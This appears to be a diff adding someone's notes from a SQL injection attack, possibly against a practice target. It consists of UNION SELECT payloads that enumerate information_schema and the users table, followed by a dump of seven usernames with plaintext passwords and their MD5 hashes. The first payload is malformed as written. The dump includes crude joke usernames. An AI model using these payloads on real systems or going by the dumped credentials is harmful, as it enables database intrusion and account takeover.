@@ -1,0 +1,17 @@
+el_peluca' union select 1,group_concat(concat(information_schema.tables,0x20,information_schema.columns)) from information_schema -- 
+
+users id
+users username
+users password
+
+
+el_peluca' and 1=2 union select 1,username from users--
+
+
+ferchu_papijas 		superadmin		17c4520f6cfd1ab53d8745e84681eb49
+el_peluca 			hello world 	5eb63bbbe01eeed093cb22bb8f5acdc3
+grandfather_fataku 	suck me			8cbf64e506adb380e4938ee18c1def03
+henry_el_traba 		administrator	200ceb26807d6bf99fd6f4f0d1ca54d4
+ana_lisa_melchotto 	love			b5c0b187fe309af0f4d35982fd961d7e
+rosa_meltroso 		peace			33ee7e1eb504b6619c1b445ca1442c21
+mj_sex_machine 		password		5f4dcc3b5aa765d61d8327deb882cf99
